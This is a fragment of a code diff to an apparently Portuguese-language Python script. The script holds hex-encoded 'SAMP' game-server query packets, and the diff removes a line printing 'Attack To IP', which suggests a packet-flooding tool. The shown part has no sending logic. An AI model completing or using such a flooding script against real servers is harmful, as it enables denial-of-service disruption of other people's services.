@@ -10,7 +10,6 @@ import os
 
 
 
-orgip = ip
 
 Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                        codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
@@ -25,7 +24,6 @@ Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
 
 
 os.system("clear")
-print("\033[31mAttack To IP %s|%s"%(orgip,port))
 
 
 
